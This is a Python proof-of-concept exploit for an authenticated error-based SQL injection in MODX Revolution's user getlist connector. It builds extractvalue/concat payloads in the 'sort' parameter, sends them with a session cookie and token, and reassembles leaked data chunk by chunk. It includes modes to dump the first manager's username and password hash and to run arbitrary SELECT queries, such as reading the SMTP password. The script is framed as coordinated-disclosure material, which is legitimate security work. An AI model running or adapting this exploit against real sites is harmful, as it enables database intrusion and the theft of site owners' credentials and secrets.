#!/usr/bin/env python3
"""
PoC for CVE-2026-50991 - MODX Revolution authenticated error-based SQL injection.

Vulnerable path:
    core/src/Revolution/Processors/Model/GetListProcessor.php
    -> falls back to the RAW user-supplied "sort" request parameter when it does
       not match a known model field, and passes it into the xPDO ORDER BY builder
       which concatenates it into the SQL with no quoting/escaping/parameterization.
    -> the clause validator (isValidClause) is a small deny-list, so the standard
       MySQL/MariaDB error-based XPATH functions (extractvalue / updatexml) and
       nested sub-queries are permitted.

Technique:
    error-based extraction via extractvalue(1, concat(0x7e, <subquery>)).
    The '~' (0x7e) prefix forces a "XPATH syntax error: '~<data>'" message which
    reflects the result of the nested read query inside the JSON error response.

extractvalue() truncates its output at 32 characters, so long values (password
hashes, keys) are read in chunks with SUBSTRING() and reassembled client-side.

Authorization: this script is for coordinated disclosure / authorized testing only.
Run it ONLY against an instance you own or are explicitly authorized to test.

Usage:
    # Confirmation only (leaks DB version + current DB user):
    python3 modx_sqli_poc.py --url https://target/connectors/index.php \
        --cookie "PHPSESSID=...; modx...=..." --token <HTTP_MODAUTH> --confirm

    # Dump first manager credential row:
    python3 modx_sqli_poc.py --url https://target/connectors/index.php \
        --cookie "..." --token <HTTP_MODAUTH> --creds

    # Arbitrary read:
    python3 modx_sqli_poc.py --url https://target/connectors/index.php \
        --cookie "..." --token <HTTP_MODAUTH> \
        --query "SELECT setting_value FROM modx_system_settings WHERE key='mail_smtp_pass'"
"""

import argparse
import re
import sys
import urllib.request
import urllib.parse

MARKER = "0x7e"          # '~' - forces the XPATH error and marks the payload start
CHUNK = 30               # < 32 to stay under extractvalue's truncation limit
ERR_RE = re.compile(r"XPATH syntax error:\s*'~?(.*?)'", re.IGNORECASE)


def send(url, cookie, token, sort_expr, verbose=False):
    """Send one getlist request with the given ORDER BY payload; return response body."""
    body = urllib.parse.urlencode({
        "action": "security/user/getlist",
        "dir": "ASC",
        "sort": sort_expr,
        "start": "0",
        "limit": "10",
    }).encode()

    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("Cookie", cookie)
    # MODX validates connector requests against the session auth token.
    if token:
        req.add_header("modAuth", token)
        req.add_header("HTTP_MODAUTH", token)

    try:
        resp = urllib.request.urlopen(req, timeout=30)
        data = resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        data = e.read().decode("utf-8", "replace")

    if verbose:
        print("  <- " + data[:400], file=sys.stderr)
    return data


def leak(url, cookie, token, inner_sql, verbose=False):
    """
    Read the scalar result of `inner_sql` via the error-based channel.
    Chunks with SUBSTRING to bypass extractvalue's 32-char truncation.
    """
    out = ""
    pos = 1
    while True:
        # SUBSTRING((<sql>), pos, CHUNK) wrapped in extractvalue's XPATH error.
        sub = "SUBSTRING((%s),%d,%d)" % (inner_sql, pos, CHUNK)
        payload = "(extractvalue(1,concat(%s,(SELECT %s))))" % (MARKER, sub)
        resp = send(url, cookie, token, payload, verbose)
        m = ERR_RE.search(resp)
        if not m:
            if pos == 1:
                print("[!] No XPATH error reflected - check auth/cookie/token, "
                      "or target may be patched. Raw response:", file=sys.stderr)
                print(resp[:600], file=sys.stderr)
            break
        piece = m.group(1)
        if not piece:
            break
        out += piece
        if len(piece) < CHUNK:
            break
        pos += CHUNK
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True,
                    help="Full connector URL, e.g. https://host/connectors/index.php")
    ap.add_argument("--cookie", required=True,
                    help="Authenticated manager session cookie header value")
    ap.add_argument("--token", default="",
                    help="Session auth token (HTTP_MODAUTH / modAuth)")
    ap.add_argument("--prefix", default="modx_", help="DB table prefix (default modx_)")
    ap.add_argument("--confirm", action="store_true",
                    help="Leak version() and current_user() to confirm the bug")
    ap.add_argument("--creds", action="store_true",
                    help="Leak first manager username:password_hash")
    ap.add_argument("--query", help="Arbitrary SELECT returning a single scalar")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    def show(label, sql):
        val = leak(args.url, args.cookie, args.token, sql, args.verbose)
        print("[+] %-18s %s" % (label + ":", val if val else "(empty / no leak)"))

    if args.confirm or not (args.creds or args.query):
        print("[*] Confirming injection (error-based, ORDER BY clause)...")
        show("DB version", "version()")
        show("Current user", "current_user()")
        show("Current schema", "database()")

    if args.creds:
        print("[*] Extracting first manager credential row...")
        p = args.prefix
        show("username:hash",
             "CONCAT(username,0x3a,password) FROM %susers ORDER BY id LIMIT 1" % p)

    if args.query:
        print("[*] Running supplied query...")
        show("result", args.query)


if __name__ == "__main__":
    main()
